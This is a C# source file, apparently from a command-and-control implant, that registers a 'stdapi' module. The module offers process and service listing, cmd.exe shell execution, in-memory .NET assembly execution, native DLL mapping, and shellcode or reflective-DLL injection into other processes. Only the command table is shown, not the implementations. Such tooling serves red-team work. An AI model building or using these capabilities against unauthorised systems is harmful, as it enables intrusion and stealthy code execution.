﻿using System.Collections.Generic;

using Drone.Modules;

namespace StandardModule;

public partial class StandardApi : DroneModule
{
    public override string Name => "stdapi";

    public override List<Command> Commands => new()
    {
        new Command("ps", "List running processes", GetProcessListing),
        new Command("services", "List services on the current or target machine", ListServices,
            new List<Command.Argument>
            {
                new("computerName")
            }),
        new Command("shell", "Run a command via cmd.exe", ExecuteShellCommand,
            new List<Command.Argument>
            {
                new("args", false)
            }),
        new Command("run", "Run a command", ExecuteRunCommand, new List<Command.Argument>
        {
            new("args")
        }),
        new Command("execute-assembly", "Execute a .NET assembly", ExecuteAssembly,
            new List<Command.Argument>
            {
                new("/path/to/assembly.exe", false, true),
                new("args")
            }, hookable: true),
        new Command("overload", "Map a native DLL into the current process and execute the specified export",
            OverloadNativeDll,
            new List<Command.Argument>
            {
                new("/path/to/file.dll", false, true),
                new("export-name", false),
                new("args")
            }, hookable: true),
        new Command("shinject", "Inject arbitrary shellcode into a process", ShellcodeInject,
            new List<Command.Argument>
            {
                new("pid", false),
                new("/path/to/shellcode.bin", false, true)
            }),
        new Command("dllinject", "Inject a native DLL as shellcode into a process", InjectReflectiveDll,
            new List<Command.Argument>
            {
                new("pid", false),
                new("/path/to/file.dll", false, true)
            })
    };
}